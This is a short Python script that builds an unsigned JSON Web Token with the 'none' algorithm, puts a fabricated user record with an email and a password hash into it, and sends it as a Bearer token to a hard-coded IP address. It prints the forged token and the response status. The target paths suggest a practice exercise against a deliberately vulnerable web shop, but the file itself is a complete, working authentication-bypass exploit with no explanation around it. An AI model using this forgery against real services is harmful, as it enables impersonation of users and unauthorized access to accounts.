import base64
import time

import requests


def encode(string):
    return base64.b64encode(string.encode('utf-8')).decode("utf-8").replace('=', '')


def gen_token():
    header = '{"alg":"none","typ":"JWT"}'
    payload = '{"status":"success","data":{"id":7,"email":"BumblebeeMan@kwike.mart","password":"7c6a180b36896a0a8c02787eeafb0e4c","createdAt":"2018-06-22T22:02:50.423Z","updatedAt":"2018-06-22T22:02:50.423Z"},"iat":' + str(
        round(time.time())) + ',"exp":' + str(round(time.time() + 18000)) + '}'
    signature = ''
    return encode(header) + '.' + encode(payload) + "." + encode(signature)


token = gen_token()
s = requests.Session()
s.headers.update({'Authorization': "Bearer " + token})
r = s.get('http://43.241.202.47:3003/rest/captcha/')  # Any URL will work here

print("Forged token:", token)
print("Status code:", r.status_code)
